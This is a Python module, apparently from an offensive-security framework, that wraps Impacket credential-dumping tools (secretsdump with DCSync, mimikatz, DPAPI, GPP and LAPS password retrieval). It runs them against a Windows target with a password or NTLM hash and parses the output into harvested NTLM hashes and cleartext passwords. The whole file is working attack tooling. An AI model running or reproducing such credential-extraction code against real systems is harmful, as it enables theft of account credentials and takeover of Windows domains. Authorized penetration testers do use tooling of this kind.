#!/usr/bin/env python3
"""
impacket_creds — Credential extraction via Impacket scripts.

CLI deps: impacket-secretsdump, impacket-mimikatz, impacket-dpapi,
          impacket-Get-GPPPassword, impacket-GetLAPSPassword
"""

import json
import re
import time

from base_module import TacticalModule

SCRIPTS = {
    "secretsdump": {"binary": "impacket-secretsdump", "desc": "SAM/LSA/NTDS dump"},
    "mimikatz": {"binary": "impacket-mimikatz", "desc": "Mimikatz via Impacket"},
    "dpapi": {"binary": "impacket-dpapi", "desc": "DPAPI credential extraction"},
    "gpp-password": {"binary": "impacket-Get-GPPPassword", "desc": "GPP password extraction"},
    "laps-password": {"binary": "impacket-GetLAPSPassword", "desc": "LAPS password retrieval"},
}


class ImpacketCreds(TacticalModule):
    name = "impacket_creds"
    description = "Credential extraction via Impacket scripts"

    def _add_module_args(self) -> None:
        self.parser.add_argument("--script", required=True, choices=list(SCRIPTS.keys()),
                                 help="Impacket creds script")
        self.parser.add_argument("--target", required=True, help="Target (DOMAIN/user:pass@IP)")
        self.parser.add_argument("--hash", help="NTLM hash")
        self.parser.add_argument("--just-dc", action="store_true", help="DCSync only (secretsdump)")
        self.parser.add_argument("--output-file", help="Output file")

    def run(self, args) -> None:
        script = SCRIPTS[args.script]
        tool_args = [args.target]

        if args.hash:
            tool_args.extend(["-hashes", args.hash])
        if args.just_dc and args.script == "secretsdump":
            tool_args.append("-just-dc")
        if args.output_file:
            tool_args.extend(["-outputfile", args.output_file])

        start = time.monotonic()
        result = self.run_tool(script["binary"], tool_args, timeout=args.timeout)
        duration_ms = int((time.monotonic() - start) * 1000)

        creds = self._parse_creds(result.stdout)

        self.log_run(args.db_path, self.name, json.dumps(vars(args), default=str),
                     result.returncode, result.stdout[:5000], result.stderr[:5000], duration_ms)
        self.output_success({
            "script": args.script, "target": args.target,
            "credentials": creds, "credential_count": len(creds),
            "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_creds(output: str) -> list[dict]:
        creds: list[dict] = []
        for line in output.split("\n"):
            line = line.strip()
            # NTLM hash format
            if re.match(r"^[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", line):
                parts = line.split(":")
                creds.append({"type": "ntlm", "username": parts[0], "hash": line[:200]})
            elif "password" in line.lower() and ":" in line:
                creds.append({"type": "cleartext", "info": line[:200]})
        return creds


if __name__ == "__main__":
    ImpacketCreds().execute()
